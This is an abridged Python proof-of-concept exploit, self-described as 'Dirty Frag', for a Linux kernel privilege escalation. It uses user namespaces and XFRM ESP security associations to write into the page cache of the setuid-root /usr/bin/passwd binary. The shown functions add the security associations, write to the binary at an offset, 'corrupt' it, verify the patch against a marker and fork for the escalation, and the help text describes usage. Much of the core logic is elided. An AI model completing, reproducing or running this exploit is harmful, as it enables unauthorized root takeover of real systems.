...
def check_required_commands():
    """Check if required commands are available using command -v"""
    required = ['splice', 'passwd', 'sh', 'bash']
    missing = []
    
    for cmd in required:
        # Skip splice - it's a syscall, not a command
        if cmd == 'splice':
            continue
        # Use command -v to check if command exists
        ret = os.system(f'command -v {cmd} > /dev/null 2>&1')
        if ret != 0:
            missing.append(cmd)
            if VERBOSE:
                print(f"[!] Command not found: {cmd}", file=sys.stderr)
    
    # Check for passwd binary existence
    if not os.path.exists(TARGET_SU):
        missing.append(TARGET_SU)
        if VERBOSE:
            print(f"[!] Target binary not found: {TARGET_SU}", file=sys.stderr)
...
def LOG(fmt, *a): 
    if VERBOSE:
        ...
        if "running ESP variant" in fmt % a or "Binary successfully patched" in fmt % a:
            print("[+] " + fmt % a, file=sys.stderr)
...
def _setup_userns():
    ...
    if VERBOSE:
        LOG("Setting up user namespace (uid=%d, gid=%d)", uid, gid)
...
def _add_xfrm_sa(spi, seqhi):
    if VERBOSE:
        DBG("Adding XFRM SA: spi=0x%08x, seqhi=0x%08x", spi, seqhi)
...
def _do_write(path, offset, spi):
    if VERBOSE:
        DBG("Writing to %s at offset 0x%x with spi=0x%08x", path, offset, spi)
    ...
    if VERBOSE:
        DBG("Write operation completed")
    return True

def _corrupt_binary():
    if VERBOSE:
        LOG("Starting binary corruption process...")
    _setup_userns()
    time.sleep(0.1)
    
    if VERBOSE:
        LOG("Adding XFRM SAs (payload length: %d bytes)", PAYLOAD_LEN)
    ...
    if VERBOSE:
        LOG("All XFRM SAs added, starting write operations...")
    ...
    if VERBOSE:
        LOG("Binary corruption completed")
    return True
...
def binary_patched():
    try:
        ...
        os.close(fd)
        patched = got == PASSWD_MARKER
        if VERBOSE:
            if patched:
                LOG("Binary verification: PATCHED successfully")
            else:
                DBG("Binary verification: Not patched (got %s)", got.hex())
        return patched
    except OSError as e:
        if VERBOSE:
            DBG("Binary verification failed: %s", e)
        return False

def lpe_main():
    if VERBOSE:
        LOG("Forking process for LPE...")
    pid = os.fork()
    if pid == 0:
...
def show_help():
    help_text = """
Dirty Frag Exploit - Linux Kernel LPE (xfrm-ESP Page-Cache Write)

Usage: python3 dirty_frag_expv2.py [OPTIONS]

Options:
  -v, --verbose     Enable verbose output mode (shows detailed debug info)
  -h, --help        Show this help message

Environment Variables:
  DIRTYFRAG_VERBOSE  Set to enable verbose mode (alternative to -v)

Target:
  This exploit targets /usr/bin/passwd (world-readable, setuid root)
  
Note:
  This is a proof-of-concept exploit. Use only on systems you own
...
def main():
    ...
    # Check required commands using command -v
    if VERBOSE:
        print("[.] Checking required commands...", file=sys.stderr)
    
    if not check_required_commands():
        WARN("Required commands missing. Please install missing dependencies.")
        if not VERBOSE:
            print("[*] Run with --verbose to see details of missing commands", file=sys.stderr)
        sys.exit(1)
